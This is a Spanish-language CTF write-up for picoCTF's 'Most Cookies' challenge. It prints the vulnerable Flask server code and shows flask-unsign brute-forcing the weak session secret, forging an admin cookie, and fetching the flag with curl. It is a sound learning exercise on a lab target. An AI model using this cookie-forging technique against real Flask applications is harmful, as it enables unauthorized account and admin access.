### Descripción
Alright, enough of using my own encryption. Flask session cookies should be plenty secure! [server.py](https://mercury.picoctf.net/static/c135543530f7dc24c3a6ecaeb44a81b8/server.py) [http://mercury.picoctf.net:65344/](http://mercury.picoctf.net:65344/)
### Solución
Se inicia dando descargando con wget, el script de python denominado como "server.py", como se aprecia a continuación:

```shell
┌──(kali㉿kali)-[~/notas-hacking]
└─$ wget https://mercury.picoctf.net/static/c135543530f7dc24c3a6ecaeb44a81b8/server.py        
--2025-04-01 21:51:53--  https://mercury.picoctf.net/static/c135543530f7dc24c3a6ecaeb44a81b8/server.py
Resolving mercury.picoctf.net (mercury.picoctf.net)... 18.189.209.142
Connecting to mercury.picoctf.net (mercury.picoctf.net)|18.189.209.142|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 2021 (2.0K) [application/octet-stream]
Saving to: ‘server.py’

server.py            100%[=====================>]   1.97K  --.-KB/s    in 0.001s  

2025-04-01 21:51:54 (1.42 MB/s) - ‘server.py’ saved [2021/2021]
```

Luego se hace clic en el enlace que se tiene en la descripción, mostrándonos un sitio que nos resulta familiar:

![[Pasted image 20250401201909.png]]

Como ya tenemos una idea, desde un principio se ingresa una galleta válida, siendo en este caso **fortune**, es decir galletas de la fortuna, por lo que al hacer clic en "search", se nos muestra lo siguiente:

![[Pasted image 20250401201958.png]]

Al revisar el código del script de python, se tiene lo siguiente:

```python
from flask import Flask, render_template, request, url_for, redirect, make_response, flash, session

import random

app = Flask(__name__)

flag_value = open("./flag").read().rstrip()

title = "Most Cookies"

cookie_names = ["snickerdoodle", "chocolate chip", "oatmeal raisin", "gingersnap", "shortbread", "peanut butter", "whoopie pie", "sugar", "molasses", "kiss", "biscotti", "butter", "spritz", "snowball", "drop", "thumbprint", "pinwheel", "wafer", "macaroon", "fortune", "crinkle", "icebox", "gingerbread", "tassie", "lebkuchen", "macaron", "black and white", "white chocolate macadamia"]

app.secret_key = random.choice(cookie_names)

  

@app.route("/")

def main():

    if session.get("very_auth"):

        check = session["very_auth"]

        if check == "blank":

            return render_template("index.html", title=title)

        else:

            return make_response(redirect("/display"))

    else:

        resp = make_response(redirect("/"))

        session["very_auth"] = "blank"

        return resp

  

@app.route("/search", methods=["GET", "POST"])

def search():

    if "name" in request.form and request.form["name"] in cookie_names:

        resp = make_response(redirect("/display"))

        session["very_auth"] = request.form["name"]

        return resp

    else:

        message = "That doesn't appear to be a valid cookie."

        category = "danger"

        flash(message, category)

        resp = make_response(redirect("/"))

        session["very_auth"] = "blank"

        return resp

  

@app.route("/reset")

def reset():

    resp = make_response(redirect("/"))

    session.pop("very_auth", None)

    return resp

  

@app.route("/display", methods=["GET"])

def flag():

    if session.get("very_auth"):

        check = session["very_auth"]

        if check == "admin":

            resp = make_response(render_template("flag.html", value=flag_value, title=title))

            return resp

        flash("That is a cookie! Not very special though...", "success")

        return render_template("not-flag.html", title=title, cookie_name=session["very_auth"])

    else:

        resp = make_response(redirect("/"))

        session["very_auth"] = "blank"

        return resp

  

if __name__ == "__main__":

    app.run()
```

Se procede entonces a hacer un diccionario de palabras para forzar un ataque de fuerza bruta hacia ese sitio, el cual se formará con el nombre de las cookies, el cual justamente se guarda como **cookies.txt**.

Después de instalar una serie de herramientas en la consola, ingresamos a un modo virtual para evitar dañar algo en el sistema operativo, por lo que la consola cambia de prompt:

```shell
┌──(.venv)─(kali㉿kali)-[~/notas-hacking]
└─$
```

Mientras tanto se obtuvo con ayuda de la herramienta de cookie editor, obtenemos el valor de la cookie del sitio web, siendo la siguiente:

```
eyJ2ZXJ5X2F1dGgiOiJmb3J0dW5lIn0.Z-ybHA._qs0IbFyWesxOdH8tgPLkVgKrtc
```

Haciendo uso de la herramienta de la herramienta **flask-unsign**, para obtener la palabra con la que fue cifrada la cookie, para lograrlo hacemos uso del siguiente comando:

```shell
┌──(.venv)─(kali㉿kali)-[~/notas-hacking]
└─$ flask-unsign --unsign --cookie "eyJ2ZXJ5X2F1dGgiOiJmb3J0dW5lIn0.Z-ybHA._qs0IbFyWesxOdH8tgPLkVgKrtc" --wordlist cookies.txt 
[*] Session decodes to: {'very_auth': 'fortune'}
[*] Starting brute-forcer with 8 threads..
[+] Found secret key after 28 attemptscadamia
'fortune'
```

Después de haber encontrado la palabra con la que cifraron la cookie, que en este caso resultó ser **forntune**, procedemos a obtener la nueva cookie, para poder obtener la bandera del reto, lo anterior se realizó en consola de la siguiente manera:

```shell
┌──(.venv)─(kali㉿kali)-[~/notas-hacking]
└─$ flask-unsign --sign --cookie "{'very_auth': 'admin'}" --secret "fortune"
eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.Z-yc3w.A1YL2xwwWgG6KcLWom5E-rxx7g0
```

Ya por último, haciendo uso del comando **curl**, para mandarle la nueva cookie al sitio web con el argumento **-H**, y filtrando el resultado con el comando **grep**, resultando en el comando siguiente:

```shell
┌──(.venv)─(kali㉿kali)-[~/notas-hacking]
└─$ curl -s http://mercury.picoctf.net:65344/display -H "Cookie: session=eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.Z-yc3w.A1YL2xwwWgG6KcLWom5E-rxx7g0" | grep -oE "picoCTF{.*?}"
picoCTF{pwn_4ll_th3_cook1E5_25bdb6f6}
```

Dándonos así pues la bandera que soluciona este reto:

```
picoCTF{pwn_4ll_th3_cook1E5_25bdb6f6}
```
### Notas Adicionales

### Referencias
